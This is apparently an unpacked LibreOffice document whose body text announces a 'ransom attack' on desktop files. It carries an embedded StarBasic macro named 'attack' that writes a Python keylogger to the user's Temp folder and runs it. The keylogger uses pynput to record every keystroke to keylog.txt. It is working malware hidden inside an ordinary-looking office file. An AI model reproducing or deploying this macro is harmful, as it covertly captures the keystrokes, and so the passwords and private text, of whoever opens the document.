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attack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9ac" officeooo:paragraph-rsid="0001a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elcome to our ransom attack, </text:p>
      <text:p text:style-name="P1"/>
      <text:p text:style-name="P1">What are we trying to do here is to hash all your files in your deskto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4:58:04.446000000</meta:creation-date>
    <dc:date>2023-03-08T17:59:28.802000000</dc:date>
    <meta:editing-duration>PT1H28M14S</meta:editing-duration>
    <meta:editing-cycles>17</meta:editing-cycles>
    <meta:generator>LibreOffice/7.0.4.2$Windows_x86 LibreOffice_project/dcf040e67528d9187c66b2379df5ea4407429775</meta:generator>
    <meta:document-statistic meta:table-count="0" meta:image-count="0" meta:object-count="0" meta:page-count="1" meta:paragraph-count="2" meta:word-count="21" meta:character-count="102" meta:non-whitespace-character-count="82"/>
  </office:meta>
</office:document-meta>
</file>

<file path=Basic/Standard/attack.xml><?xml version="1.0" encoding="utf-8"?>
<!DOCTYPE module  PUBLIC '-//OpenOffice.org//DTD OfficeDocument 1.0//EN'  'module.dtd'>
<script:module xmlns:script="http://openoffice.org/2000/script" script:name="attack" script:language="StarBasic" script:moduleType="normal">REM  *****  BASIC  *****

Sub Main

	Dim oSFA As Object, oOutStream as Object, oOutText as Object
	Dim sFilePath as String
	
	oSFA = createUNOService("com.sun.star.ucb.SimpleFileAccess")
	sFilePath = "C:\Users\lucas" + "\AppData\Local\Temp\attack.py"
	
	If oSFA.exists(sFilePath) Then
		oSFA.kill(sFilePath) 
		End If
	
	oOutStream = oSFA.openFileWrite(sFilePath)
	oOutText = createUNOService ("com.sun.star.io.TextOutputStream")
	oOutText.setOutputStream(oOutStream)
	
	oOutText.WriteString("from pynput.keyboard import Key" + Chr(13) + Chr(10))
	oOutText.WriteString("from pynput.keyboard import Listener" + Chr(13) + Chr(10))
	

	oOutText.WriteString("the_keys = []" + Chr(13) + Chr(10))
	oOutText.WriteString("def functionPerKey(key):" + Chr(13) + Chr(10))
	oOutText.WriteString("    the_keys.append(key)" + Chr(13) + Chr(10))
    oOutText.WriteString("    storeKeysToFile(the_keys)" + Chr(13) + Chr(10))
    
    oOutText.WriteString("def storeKeysToFile(keys):" + Chr(13) + Chr(10))
	oOutText.WriteString("    with open('keylog.txt','w') as log:" + Chr(13) + Chr(10))
    oOutText.WriteString("      for the_key in keys:" + Chr(13) + Chr(10))
    oOutText.WriteString("       the_key = str(the_key).replace(""'"","""")" + Chr(13) + Chr(10))
    oOutText.WriteString("       log.write(the_key)" + Chr(13) + Chr(10)) 
    
    oOutText.WriteString("def onEachKeyRelease(the_key):" + Chr(13) + Chr(10))
	oOutText.WriteString("    if the_key == Key.esc:" + Chr(13) + Chr(10))
    oOutText.WriteString("      return False" + Chr(13) + Chr(10))   
    
    oOutText.WriteString("with Listener(" + Chr(13) + Chr(10))
    oOutText.WriteString("  on_press = functionPerKey," + Chr(13) + Chr(10))
    oOutText.WriteString("  on_release = onEachKeyRelease," + Chr(13) + Chr(10))
    oOutText.WriteString(") as the_listener:" + Chr(13) + Chr(10))
    oOutText.WriteString("     the_listener.join()" + Chr(13) + Chr(10))
   Shell("C:\Users\lucas\AppData\Local\Programs\Python\Python311\python.exe " + sFilePath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tta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